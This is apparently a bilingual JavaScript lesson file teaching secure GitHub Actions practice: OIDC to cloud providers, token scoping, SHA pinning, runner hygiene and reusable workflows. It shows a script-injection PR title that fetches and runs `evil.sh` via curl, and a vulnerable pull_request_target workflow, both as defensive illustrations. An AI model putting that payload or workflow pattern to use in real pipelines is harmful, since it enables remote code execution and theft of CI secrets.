window.INFRA = window.INFRA || { lessons: [], glossary: [], scenarios: [] };
// CI/CD deep dives: GitHub Actions in production, release engineering, DORA metrics, the IaC landscape.
// Note: GitHub Actions expressions are written as \${{ ... }} inside template literals so this file parses.

/* ------------------------------------------------------------------ 1. GitHub Actions in production */
window.INFRA.lessons.push({
  id: "cicd-github-actions",
  track: "cloud",
  order: 60,
  icon: "⚙️",
  level: 3,
  minutes: 16,
  title: { en: "GitHub Actions in Production", he: "GitHub Actions בפרודקשן" },
  tldr: {
    en: "A workflow is code that runs with your cloud credentials: federate with OIDC instead of storing keys, give GITHUB_TOKEN the minimum permissions, pin third-party actions by commit SHA, never run fork code with secrets, and make runners ephemeral.",
    he: "Workflow הוא קוד שרץ עם ה-credentials שלך לענן: עובדים עם OIDC במקום לשמור מפתחות, נותנים ל-GITHUB_TOKEN את ההרשאות המינימליות, נועלים actions חיצוניים לפי commit SHA, אף פעם לא מריצים קוד מ-fork עם secrets, ו-runner-ים הם ephemeral."
  },
  analogy: {
    en: "Your CI system is a robot with the master key to the building. Every action you pull in with <code>uses:</code> is a stranger you let ride along with the robot. Pinning by tag is trusting a name badge (anyone who steals the badge printer can reprint it); pinning by SHA is checking a fingerprint. OIDC means the robot gets a visitor pass that expires in an hour instead of carrying a copy of the master key forever.",
    he: "מערכת ה-CI שלך היא רובוט עם המפתח הראשי לבניין. כל action שאתה עושה לו <code>uses:</code> הוא זר שאתה נותן לו לנסוע עם הרובוט. נעילה לפי tag זה לסמוך על תג שם (מי שגונב את מכונת התגים מדפיס חדש); נעילה לפי SHA זה לבדוק טביעת אצבע. OIDC אומר שהרובוט מקבל אישור כניסה שפג אחרי שעה, במקום להסתובב לנצח עם עותק של המפתח הראשי."
  },
  sections: [
    {
      h: { en: "Anatomy and the trust model", he: "האנטומיה של workflow ומודל האמון" },
      body: {
        en: `<p>A <strong>workflow</strong> (<code>.github/workflows/*.yml</code>) is triggered by an <strong>event</strong> (<code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code>, <code>schedule</code>, <code>release</code>…). It contains <strong>jobs</strong> that run in parallel on separate <strong>runners</strong> (fresh VMs on GitHub-hosted) unless chained with <code>needs:</code>. Each job is a list of <strong>steps</strong>: either <code>run:</code> (shell) or <code>uses:</code> (an action — someone else's code, executed with your job's privileges).</p>
<p>What a job can touch is decided by the event:</p>
<table>
<tr><th>Trigger</th><th>Code that runs</th><th>Secrets?</th><th>GITHUB_TOKEN</th></tr>
<tr><td><code>push</code> to main</td><td>your merged code</td><td>yes</td><td>as configured</td></tr>
<tr><td><code>pull_request</code> from a branch in the repo</td><td>PR code</td><td>yes</td><td>as configured</td></tr>
<tr><td><code>pull_request</code> from a <strong>fork</strong></td><td>PR code (untrusted)</td><td><strong>no</strong></td><td>read-only</td></tr>
<tr><td><code>pull_request_target</code></td><td>workflow from the <strong>base</strong> branch</td><td><strong>yes</strong></td><td>can write</td></tr>
</table>
<p>Two settings worth knowing on day one: every job has a default <code>timeout-minutes</code> of <strong>360</strong> (a hung test burns 6 hours of minutes — set 15-30), and organizations created after February 2023 default <code>GITHUB_TOKEN</code> to read-only, while older orgs often still have the permissive read/write default.</p>
<blockquote>💡 Real world: treat <code>.github/workflows/</code> as production code. Put it under CODEOWNERS owned by the platform/security team — a one-line change there can ship your cloud credentials anywhere.</blockquote>`,
        he: `<p><strong>Workflow</strong> (<code>.github/workflows/*.yml</code>) מופעל ע"י <strong>event</strong> (<code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code>, <code>schedule</code>, <code>release</code>…). הוא מכיל <strong>jobs</strong> שרצים במקביל, כל אחד על <strong>runner</strong> נפרד (VM טרי ב-GitHub-hosted), אלא אם שרשרת אותם עם <code>needs:</code>. כל job הוא רשימת <strong>steps</strong>: או <code>run:</code> (shell) או <code>uses:</code> (action — קוד של מישהו אחר שרץ עם ההרשאות של ה-job שלך).</p>
<p>מה ש-job יכול לגעת בו נקבע לפי ה-event:</p>
<table>
<tr><th>Trigger</th><th>איזה קוד רץ</th><th>Secrets?</th><th>GITHUB_TOKEN</th></tr>
<tr><td><code>push</code> ל-main</td><td>הקוד שעבר merge</td><td>כן</td><td>לפי ההגדרה</td></tr>
<tr><td><code>pull_request</code> מ-branch בתוך ה-repo</td><td>קוד ה-PR</td><td>כן</td><td>לפי ההגדרה</td></tr>
<tr><td><code>pull_request</code> מ-<strong>fork</strong></td><td>קוד ה-PR (לא אמין)</td><td><strong>לא</strong></td><td>read-only</td></tr>
<tr><td><code>pull_request_target</code></td><td>ה-workflow מה-branch של ה-<strong>base</strong></td><td><strong>כן</strong></td><td>יכול לכתוב</td></tr>
</table>
<p>שתי הגדרות שכדאי להכיר מהיום הראשון: לכל job יש <code>timeout-minutes</code> ברירת מחדל של <strong>360</strong> (טסט תקוע שורף 6 שעות של דקות — תגדיר 15-30), וארגונים שנוצרו אחרי פברואר 2023 מקבלים <code>GITHUB_TOKEN</code> שהוא read-only כברירת מחדל, בזמן שארגונים ותיקים לרוב עדיין עם ברירת המחדל המתירנית של read/write.</p>
<blockquote>💡 Real world: תתייחס ל-<code>.github/workflows/</code> כמו לקוד פרודקשן. תשים אותו תחת CODEOWNERS של צוות ה-platform או ה-security — שינוי של שורה אחת שם יכול לשלוח את ה-credentials שלך לענן לכל מקום.</blockquote>`
      }
    },
    {
      h: { en: "OIDC to AWS, Azure and GCP — no long-lived keys", he: "OIDC ל-AWS, Azure ו-GCP — בלי מפתחות ארוכי-טווח" },
      body: {
        en: `<p>With <code>permissions: id-token: write</code>, a job can request a JWT from <code>https://token.actions.githubusercontent.com</code>. Its <code>sub</code> claim describes exactly who is asking: <code>repo:acme/api:ref:refs/heads/main</code>, <code>repo:acme/api:environment:production</code> or <code>repo:acme/api:pull_request</code>. The cloud verifies the signature and hands back short-lived credentials (AWS default: 1 hour).</p>
<p><strong>AWS</strong> — IAM OIDC provider + role trust policy:</p>
<pre>{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:acme/api:environment:production"
      }
    }
  }]
}</pre>
<pre>- uses: aws-actions/configure-aws-credentials@&lt;sha&gt;  # v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/gha-api-deploy
    aws-region: eu-central-1
    role-duration-seconds: 900</pre>
<p><strong>Azure</strong> — a federated credential on an app registration or user-assigned managed identity (issuer <code>https://token.actions.githubusercontent.com</code>, subject <code>repo:acme/api:environment:production</code>, audience <code>api://AzureADTokenExchange</code>), then <code>azure/login</code> with only <code>client-id</code>, <code>tenant-id</code>, <code>subscription-id</code> — no client secret.</p>
<p><strong>GCP</strong> — a Workload Identity Pool + OIDC provider with an <strong>attribute condition</strong> such as <code>assertion.repository == 'acme/api'</code>, then <code>google-github-actions/auth</code> with <code>workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/github/providers/github</code>.</p>
<blockquote>⚠️ Production tip: the security of OIDC is 100% in the condition. <code>StringLike "repo:acme/*"</code> means any repo in the org — including a brand-new one an attacker with repo-create rights makes — can assume your prod role. Pin the exact repo plus <code>environment:production</code>, and give PR builds a separate read-only role.</blockquote>`,
        he: `<p>עם <code>permissions: id-token: write</code>, job יכול לבקש JWT מ-<code>https://token.actions.githubusercontent.com</code>. ה-claim שנקרא <code>sub</code> מתאר בדיוק מי מבקש: <code>repo:acme/api:ref:refs/heads/main</code>, <code>repo:acme/api:environment:production</code> או <code>repo:acme/api:pull_request</code>. הענן מאמת את החתימה ומחזיר credentials קצרי-מועד (ב-AWS ברירת המחדל היא שעה).</p>
<p><strong>AWS</strong> — OIDC provider ב-IAM ו-trust policy על ה-role:</p>
<pre>{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:acme/api:environment:production"
      }
    }
  }]
}</pre>
<pre>- uses: aws-actions/configure-aws-credentials@&lt;sha&gt;  # v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/gha-api-deploy
    aws-region: eu-central-1
    role-duration-seconds: 900</pre>
<p><strong>Azure</strong> — federated credential על app registration או user-assigned managed identity (issuer <code>https://token.actions.githubusercontent.com</code>, subject <code>repo:acme/api:environment:production</code>, audience <code>api://AzureADTokenExchange</code>), ואז <code>azure/login</code> עם <code>client-id</code>, <code>tenant-id</code> ו-<code>subscription-id</code> בלבד — בלי client secret.</p>
<p><strong>GCP</strong> — Workload Identity Pool ו-OIDC provider עם <strong>attribute condition</strong> כמו <code>assertion.repository == 'acme/api'</code>, ואז <code>google-github-actions/auth</code> עם <code>workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/github/providers/github</code>.</p>
<blockquote>⚠️ Production tip: כל האבטחה של OIDC נמצאת ב-condition. <code>StringLike "repo:acme/*"</code> אומר שכל repo בארגון — כולל repo חדש שתוקף עם הרשאת יצירת repos פותח — יכול לקבל את ה-role של פרוד. תנעל את ה-repo המדויק ועוד <code>environment:production</code>, ותן ל-builds של PR role נפרד שהוא read-only.</blockquote>`
      }
    },
    {
      h: { en: "Least privilege: GITHUB_TOKEN, SHA pinning, pull_request_target", he: "Least privilege: GITHUB_TOKEN, נעילה לפי SHA ו-pull_request_target" },
      body: {
        en: `<p><strong>1. Scope the token.</strong> Set the workflow default to nothing and grant per job:</p>
<pre>permissions: {}            # workflow level: no scopes at all
jobs:
  test:
    permissions:
      contents: read
  release:
    permissions:
      contents: write        # create tag + GitHub release
      id-token: write        # OIDC to the cloud
      packages: write        # push to ghcr.io</pre>
<p><strong>2. Pin actions by full commit SHA.</strong> Tags are mutable. In March 2025 attackers retargeted every tag of <code>tj-actions/changed-files</code> (used by ~23,000 repos, CVE-2025-30066) to a commit that dumped runner memory — including secrets — into build logs. Repos pinned to a SHA were unaffected.</p>
<pre>- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2</pre>
<p>Let Dependabot (<code>package-ecosystem: github-actions</code>) or Renovate bump the SHAs, and enforce it with the org setting "require actions to be pinned to a full-length commit SHA" plus an allow-list of actions.</p>
<p><strong>3. Never run untrusted code in a privileged context.</strong> <code>pull_request_target</code> exists so a workflow can label or comment on fork PRs — it runs with secrets and a write token. The classic "pwn request" is checking out the PR head and building it:</p>
<pre>on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@&lt;sha&gt;
        with:
          ref: \${{ github.event.pull_request.head.sha }}   # attacker's code...
      - run: npm install &amp;&amp; npm test                      # ...runs with your secrets</pre>
<p>A <code>preinstall</code> script in the attacker's <code>package.json</code> now owns your secrets. The same goes for <strong>script injection</strong>: <code>run: echo "\${{ github.event.pull_request.title }}"</code> pastes attacker text straight into bash — a title like <code>"; curl evil.sh | sh; #</code> executes. Pass it through <code>env:</code> instead (<code>env: TITLE: \${{ github.event.pull_request.title }}</code> then <code>"$TITLE"</code>).</p>
<blockquote>⚠️ Production tip: run <code>zizmor</code> or <code>actionlint</code> in CI against your workflows. They flag unpinned actions, <code>pull_request_target</code> with checkout of the head, template injection and over-broad permissions in seconds.</blockquote>`,
        he: `<p><strong>1. להגביל את ה-token.</strong> מגדירים ברירת מחדל ריקה ברמת ה-workflow ונותנים הרשאות לכל job בנפרד:</p>
<pre>permissions: {}            # workflow level: no scopes at all
jobs:
  test:
    permissions:
      contents: read
  release:
    permissions:
      contents: write        # create tag + GitHub release
      id-token: write        # OIDC to the cloud
      packages: write        # push to ghcr.io</pre>
<p><strong>2. לנעול actions לפי commit SHA מלא.</strong> Tags ניתנים לשינוי. במרץ 2025 תוקפים הזיזו את כל ה-tags של <code>tj-actions/changed-files</code> (בשימוש של ~23,000 repos, CVE-2025-30066) ל-commit ששפך את הזיכרון של ה-runner — כולל secrets — ללוגים של ה-build. Repos שהיו נעולים על SHA לא נפגעו.</p>
<pre>- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2</pre>
<p>תן ל-Dependabot (<code>package-ecosystem: github-actions</code>) או ל-Renovate לעדכן את ה-SHA-ים, ותאכוף את זה עם הגדרת הארגון שמחייבת pinning ל-SHA מלא, יחד עם allow-list של actions.</p>
<p><strong>3. אף פעם לא להריץ קוד לא אמין בהקשר מורשה.</strong> <code>pull_request_target</code> קיים כדי ש-workflow יוכל לשים label או להגיב על PR-ים מ-fork — הוא רץ עם secrets ו-token עם הרשאות כתיבה. ה-"pwn request" הקלאסי הוא לעשות checkout ל-head של ה-PR ולבנות אותו:</p>
<pre>on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@&lt;sha&gt;
        with:
          ref: \${{ github.event.pull_request.head.sha }}   # attacker's code...
      - run: npm install &amp;&amp; npm test                      # ...runs with your secrets</pre>
<p>סקריפט <code>preinstall</code> ב-<code>package.json</code> של התוקף שולט עכשיו ב-secrets שלך. אותו דבר עם <strong>script injection</strong>: <code>run: echo "\${{ github.event.pull_request.title }}"</code> מדביק טקסט של התוקף ישר ל-bash — כותרת כמו <code>"; curl evil.sh | sh; #</code> פשוט רצה. מעבירים את זה דרך <code>env:</code> (<code>env: TITLE: \${{ github.event.pull_request.title }}</code> ואז <code>"$TITLE"</code>).</p>
<blockquote>⚠️ Production tip: תריץ <code>zizmor</code> או <code>actionlint</code> ב-CI על ה-workflows עצמם. הם מסמנים תוך שניות actions לא נעולים, <code>pull_request_target</code> עם checkout של ה-head, template injection והרשאות רחבות מדי.</blockquote>`
      }
    },
    {
      h: { en: "Speed: caching, matrix, concurrency", he: "מהירות: caching, matrix ו-concurrency" },
      body: {
        en: `<pre>name: ci
on: [pull_request]
concurrency:
  group: ci-\${{ github.workflow }}-\${{ github.event.pull_request.number }}
  cancel-in-progress: true          # new push cancels the stale run
jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22]
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@&lt;sha&gt;
      - uses: actions/setup-node@&lt;sha&gt;
        with: { node-version: "\${{ matrix.node }}", cache: npm }
      - run: npm ci
      - run: npx jest --shard=\${{ matrix.shard }}/4</pre>
<ul>
<li><strong>Cache</strong>: key on the lockfile hash (<code>hashFiles('**/package-lock.json')</code>). Repos get 10 GB of cache by default; entries unused for 7 days are evicted. PR runs can read caches from the base branch but write only to their own ref scope — that is what keeps a malicious PR from poisoning main's cache.</li>
<li><strong>Matrix</strong>: up to 256 jobs per matrix. Shard slow test suites (8 shards of a 24-minute suite ≈ 4 minutes wall clock, same billed minutes plus setup overhead).</li>
<li><strong>Concurrency</strong>: for PRs, <code>cancel-in-progress: true</code>. For deploys, use a group like <code>deploy-production</code> with <code>cancel-in-progress: false</code> — runs queue one at a time, and a newer pending run replaces an older pending one, so you never have two deploys racing on the same environment.</li>
<li><strong>Path filters</strong>: <code>on: pull_request: paths: ['services/api/**']</code> in a monorepo stops every PR from running every pipeline. Pair it with a required "summary" job so branch protection still works when a workflow is skipped.</li>
</ul>`,
        he: `<pre>name: ci
on: [pull_request]
concurrency:
  group: ci-\${{ github.workflow }}-\${{ github.event.pull_request.number }}
  cancel-in-progress: true          # new push cancels the stale run
jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22]
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@&lt;sha&gt;
      - uses: actions/setup-node@&lt;sha&gt;
        with: { node-version: "\${{ matrix.node }}", cache: npm }
      - run: npm ci
      - run: npx jest --shard=\${{ matrix.shard }}/4</pre>
<ul>
<li><strong>Cache</strong>: מפתח לפי hash של ה-lockfile (<code>hashFiles('**/package-lock.json')</code>). כל repo מקבל 10 GB של cache כברירת מחדל; רשומות שלא נגעו בהן 7 ימים נמחקות. ריצות של PR יכולות לקרוא caches מה-branch של ה-base אבל לכתוב רק ל-scope של ה-ref שלהן — זה מה שמונע מ-PR זדוני להרעיל את ה-cache של main.</li>
<li><strong>Matrix</strong>: עד 256 jobs ל-matrix. מפצלים test suites איטיים (8 shards של suite של 24 דקות ≈ 4 דקות בזמן אמיתי, אותן דקות בחשבון ועוד overhead של setup).</li>
<li><strong>Concurrency</strong>: ל-PR-ים, <code>cancel-in-progress: true</code>. ל-deploys, group כמו <code>deploy-production</code> עם <code>cancel-in-progress: false</code> — הריצות עומדות בתור אחת-אחת, וריצה ממתינה חדשה מחליפה ריצה ממתינה ישנה, כך שאף פעם אין שני deploys שמתחרים על אותה סביבה.</li>
<li><strong>Path filters</strong>: <code>on: pull_request: paths: ['services/api/**']</code> ב-monorepo מונע מכל PR להריץ כל pipeline. תצמיד לזה job "summary" שהוא required, כדי שה-branch protection ימשיך לעבוד גם כש-workflow מדולג.</li>
</ul>`
      }
    },
    {
      h: { en: "Runners: hosted, self-hosted, ephemeral, ARC — and cost", he: "Runners: hosted, self-hosted, ephemeral, ARC — ועלות" },
      body: {
        en: `<p><strong>GitHub-hosted</strong> runners are a fresh VM per job, destroyed afterwards — the safest default. Billing is per minute on private repos (standard runners are free on public repos); plans include 2,000 (Free), 3,000 (Team) or 50,000 (Enterprise) Linux minutes a month. Windows minutes cost about 2× Linux and macOS about 10×, so a macOS-heavy iOS pipeline is often the biggest line on the bill. Larger runners (4-64 vCPU, GPU, ARM) cost proportionally more per minute but often finish faster.</p>
<p><strong>Self-hosted</strong> runners make sense for private-network access (deploy into a VPC with no public endpoint), special hardware, or very high volume. Rules:</p>
<ul>
<li><strong>Ephemeral only</strong> (<code>./config.sh --ephemeral</code>): one job, then the runner deregisters and the machine is destroyed. A persistent runner lets job N plant a backdoor that steals job N+1's secrets.</li>
<li><strong>Never</strong> attach self-hosted runners to public repos — any fork PR can run code on them.</li>
<li>Separate runner groups per trust level (PR builds vs prod deploys), restricted to specific repos.</li>
</ul>
<p><strong>Actions Runner Controller (ARC)</strong> runs ephemeral runners as Pods on Kubernetes, autoscaled from the job queue:</p>
<pre>helm install arc --namespace arc-systems --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

helm install arc-linux --namespace arc-runners --create-namespace \
  --set githubConfigUrl="https://github.com/acme" \
  --set githubConfigSecret=gh-app-secret \
  --set minRunners=0 --set maxRunners=50 \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set

# workflow:  runs-on: arc-linux</pre>
<blockquote>💡 Real world: authenticate ARC with a GitHub App (not a PAT), put runner Pods on a dedicated node pool with no IAM role beyond what builds need, and block the cloud metadata endpoint (169.254.169.254) from runner Pods — otherwise every build inherits the node's cloud identity. Docker-in-Docker requires privileged Pods; prefer rootless BuildKit or Kaniko-style builders.</blockquote>`,
        he: `<p>Runners מסוג <strong>GitHub-hosted</strong> הם VM טרי לכל job שנמחק בסוף — ברירת המחדל הכי בטוחה. החיוב הוא לפי דקה ב-repos פרטיים (runners סטנדרטיים חינם ב-repos ציבוריים); התוכניות כוללות 2,000 (Free), 3,000 (Team) או 50,000 (Enterprise) דקות Linux בחודש. דקת Windows עולה בערך פי 2 מ-Linux ודקת macOS בערך פי 10, אז pipeline של iOS שנשען על macOS הוא לרוב השורה הכי גדולה בחשבון. Larger runners (4-64 vCPU, GPU, ARM) עולים יותר לדקה באופן יחסי אבל לרוב מסיימים מהר יותר.</p>
<p>Runners מסוג <strong>self-hosted</strong> הגיוניים כשצריך גישה לרשת פרטית (deploy לתוך VPC בלי endpoint ציבורי), חומרה מיוחדת, או נפח מאוד גבוה. הכללים:</p>
<ul>
<li><strong>רק ephemeral</strong> (<code>./config.sh --ephemeral</code>): job אחד, ואז ה-runner מוריד את הרישום שלו והמכונה נהרסת. Runner קבוע מאפשר ל-job מספר N לשתול backdoor שגונב את ה-secrets של job מספר N+1.</li>
<li><strong>אף פעם</strong> לא לחבר runners מסוג self-hosted ל-repos ציבוריים — כל PR מ-fork יכול להריץ עליהם קוד.</li>
<li>Runner groups נפרדים לכל רמת אמון (builds של PR מול deploys לפרוד), מוגבלים ל-repos ספציפיים.</li>
</ul>
<p><strong>Actions Runner Controller (ARC)</strong> מריץ runners ephemeral כ-Pods על Kubernetes, עם autoscaling לפי תור ה-jobs:</p>
<pre>helm install arc --namespace arc-systems --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

helm install arc-linux --namespace arc-runners --create-namespace \
  --set githubConfigUrl="https://github.com/acme" \
  --set githubConfigSecret=gh-app-secret \
  --set minRunners=0 --set maxRunners=50 \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set

# workflow:  runs-on: arc-linux</pre>
<blockquote>💡 Real world: תאמת את ARC עם GitHub App (לא PAT), תשים את ה-Pods של ה-runners על node pool ייעודי בלי IAM role מעבר למה שה-builds צריכים, ותחסום מה-Pods של ה-runners את ה-metadata endpoint של הענן (169.254.169.254) — אחרת כל build יורש את ה-identity של ה-node. Docker-in-Docker דורש Pods מסוג privileged; עדיף BuildKit במצב rootless או builders בסגנון Kaniko.</blockquote>`
      }
    },
    {
      h: { en: "Reusable workflows, environments and required reviewers", he: "Reusable workflows, environments ו-required reviewers" },
      body: {
        en: `<p>With 200 repos, copy-pasted deploy YAML drifts within months. A <strong>reusable workflow</strong> is a central, versioned pipeline that repos call like a function:</p>
<pre># acme/platform-workflows/.github/workflows/deploy.yml
on:
  workflow_call:
    inputs:
      service: { type: string, required: true }
      environment: { type: string, required: true }
jobs:
  deploy:
    runs-on: ubuntu-24.04
    environment: \${{ inputs.environment }}
    permissions: { contents: read, id-token: write }
    steps:
      - run: echo "deploying \${{ inputs.service }}"</pre>
<pre># caller in acme/api
jobs:
  prod:
    uses: acme/platform-workflows/.github/workflows/deploy.yml@&lt;sha&gt;
    with: { service: api, environment: production }
    secrets: inherit</pre>
<p>The OIDC token of a job inside a reusable workflow carries a <code>job_workflow_ref</code> claim. Customize the <code>sub</code> claim to include it and your cloud role can say: "only the platform team's deploy workflow may deploy to prod" — app teams cannot write their own deploy steps around the guardrails.</p>
<p><strong>Environments</strong> (<code>environment: production</code>) are where governance lives: required reviewers (up to 6 people/teams, with "prevent self-review"), a wait timer, allowed deployment branches/tags (only <code>main</code> or <code>v*</code> tags), and environment-scoped secrets that a job only receives after the gates pass. Combined with an OIDC trust policy on <code>environment:production</code>, a workflow on a random branch cannot even obtain prod credentials.</p>
<blockquote>⚠️ Production tip: human approval on every prod deploy feels safe but turns into rubber-stamping at 20 deploys/day. Prefer automated gates (tests, canary analysis, SLO burn) and keep human approval for infra changes, first deploys of a service, or freeze periods.</blockquote>`,
        he: `<p>עם 200 repos, YAML של deploy שהועתק מ-repo ל-repo מתפזר לכל הכיוונים תוך כמה חודשים. <strong>Reusable workflow</strong> הוא pipeline מרכזי עם גרסאות, ש-repos קוראים לו כמו לפונקציה:</p>
<pre># acme/platform-workflows/.github/workflows/deploy.yml
on:
  workflow_call:
    inputs:
      service: { type: string, required: true }
      environment: { type: string, required: true }
jobs:
  deploy:
    runs-on: ubuntu-24.04
    environment: \${{ inputs.environment }}
    permissions: { contents: read, id-token: write }
    steps:
      - run: echo "deploying \${{ inputs.service }}"</pre>
<pre># caller in acme/api
jobs:
  prod:
    uses: acme/platform-workflows/.github/workflows/deploy.yml@&lt;sha&gt;
    with: { service: api, environment: production }
    secrets: inherit</pre>
<p>ל-OIDC token של job שרץ בתוך reusable workflow יש claim בשם <code>job_workflow_ref</code>. אם תתאים את ה-claim שנקרא <code>sub</code> כך שיכלול אותו, ה-role בענן יכול להגיד: "רק ה-workflow של צוות ה-platform רשאי לעשות deploy לפרוד" — צוותי האפליקציה לא יכולים לכתוב steps משלהם שעוקפים את ה-guardrails.</p>
<p><strong>Environments</strong> (<code>environment: production</code>) הם המקום של ה-governance: required reviewers (עד 6 אנשים או צוותים, עם "prevent self-review"), wait timer, branches ו-tags מורשים ל-deploy (רק <code>main</code> או tags של <code>v*</code>), ו-secrets ברמת הסביבה ש-job מקבל רק אחרי שכל ה-gates עברו. יחד עם trust policy של OIDC על <code>environment:production</code>, workflow מ-branch אקראי לא יכול אפילו להשיג credentials לפרוד.</p>
<blockquote>⚠️ Production tip: אישור אנושי על כל deploy לפרוד מרגיש בטוח, אבל ב-20 deploys ביום זה הופך לחותמת גומי. עדיף gates אוטומטיים (טסטים, canary analysis, SLO burn) ולהשאיר אישור אנושי לשינויי תשתית, ל-deploy ראשון של שירות או לתקופות freeze.</blockquote>`
      }
    }
  ],
  diagram: "PR (fork) --pull_request--> runner [no secrets, read-only token]\nmerge -> main --push--> build+test --> image@sha256 --> deploy job\n                                                     environment: production (reviewers, branch rule)\n                                                     | id-token: write\n                                                     v\n            token.actions.githubusercontent.com --JWT sub=repo:acme/api:environment:production--> AWS STS\n                                                     <-- 15-60 min credentials --",
  handsOn: [
    { cmd: "gh api repos/acme/api/actions/permissions/workflow", what: { en: "Check the repo's default GITHUB_TOKEN permission (read vs write) and whether Actions may approve PRs.", he: "לבדוק מה הרשאת ברירת המחדל של GITHUB_TOKEN ב-repo (read או write) והאם Actions יכול לאשר PR-ים." } },
    { cmd: "grep -rnE 'uses: [^@]+@(v[0-9]|main|master)' .github/workflows/", what: { en: "Find actions pinned to a mutable tag or branch instead of a commit SHA.", he: "למצוא actions שנעולים על tag או branch שניתנים לשינוי במקום על commit SHA." } },
    { cmd: "pipx run zizmor .github/workflows/", what: { en: "Static-analyze workflows for pwn requests, template injection, unpinned actions and excessive permissions.", he: "ניתוח סטטי של ה-workflows: pwn requests, template injection, actions לא נעולים והרשאות מופרזות." } },
    { cmd: "aws iam get-role --role-name gha-api-deploy --query 'Role.AssumeRolePolicyDocument'", what: { en: "Read the OIDC trust policy and verify the sub condition pins one repo and environment, not a wildcard.", he: "לקרוא את ה-trust policy של OIDC ולוודא שה-condition על sub נועל repo וסביבה אחד, לא wildcard." } },
    { cmd: "gh run list --workflow deploy.yml --limit 20 --json conclusion,event,headBranch,createdAt", what: { en: "Audit recent deploy runs: which events and branches actually triggered them.", he: "לבדוק את ריצות ה-deploy האחרונות: אילו events ו-branches באמת הפעילו אותן." } }
  ],
  mnemonic: {
    en: "OPPE: OIDC not keys, Permissions minimal, Pin by SHA, Ephemeral runners — and fork code never meets secrets.",
    he: "OPPE: OIDC ולא מפתחות, Permissions מינימליות, Pin לפי SHA, runners מסוג Ephemeral — וקוד מ-fork אף פעם לא פוגש secrets."
  },
  pitfalls: [
    { en: "Using pull_request_target to 'make secrets work for fork PRs' and then checking out the PR head. That is remote code execution with your secrets by design.", he: "להשתמש ב-pull_request_target כדי 'שה-secrets יעבדו ל-PR-ים מ-fork' ואז לעשות checkout ל-head של ה-PR. זה remote code execution עם ה-secrets שלך, by design." },
    { en: "OIDC trust policy with StringLike on repo:org/* or missing the sub condition entirely: any workflow in the org (or, without aud/sub checks, potentially anyone's GitHub workflow) can assume the role.", he: "Trust policy של OIDC עם StringLike על repo:org/* או בלי condition על sub בכלל: כל workflow בארגון (ובלי בדיקות aud/sub אולי כל workflow ב-GitHub) יכול לקבל את ה-role." },
    { en: "Persistent self-hosted runners shared between PR builds and prod deploys — one malicious build leaves a process behind that reads the next job's secrets.", he: "Self-hosted runners קבועים שמשותפים בין builds של PR ל-deploys לפרוד — build זדוני אחד משאיר תהליך שקורא את ה-secrets של ה-job הבא." },
    { en: "Leaving the 360-minute default timeout: a hung integration test on a 64-core larger runner quietly costs more than the team's coffee budget.", he: "להשאיר את ה-timeout ברירת המחדל של 360 דקות: טסט integration תקוע על larger runner של 64 cores עולה בשקט יותר מתקציב הקפה של הצוות." }
  ],
  interview: [
    {
      q: { en: "How do you let GitHub Actions deploy to AWS without storing any AWS keys?", he: "איך נותנים ל-GitHub Actions לעשות deploy ל-AWS בלי לשמור שום מפתח של AWS?" },
      a: { en: "Register token.actions.githubusercontent.com as an IAM OIDC provider, create a role whose trust policy allows sts:AssumeRoleWithWebIdentity only when aud is sts.amazonaws.com and sub equals repo:org/repo:environment:production. The job requests id-token: write, gets a signed JWT, exchanges it for 15-60 minute credentials. Nothing static exists to leak; scope the role's permissions to the deploy and use a separate read-only role for PRs.", he: "רושמים את token.actions.githubusercontent.com כ-OIDC provider ב-IAM, יוצרים role שה-trust policy שלו מתיר sts:AssumeRoleWithWebIdentity רק כש-aud הוא sts.amazonaws.com ו-sub שווה ל-repo:org/repo:environment:production. ה-job מבקש id-token: write, מקבל JWT חתום ומחליף אותו ב-credentials ל-15-60 דקות. אין שום דבר סטטי שיכול לדלוף; מגבילים את ההרשאות של ה-role ל-deploy בלבד ונותנים role נפרד ו-read-only ל-PR-ים." }
    },
    {
      q: { en: "Why pin actions by SHA if you trust the vendor?", he: "למה לנעול actions לפי SHA אם אתה סומך על הספק?" },
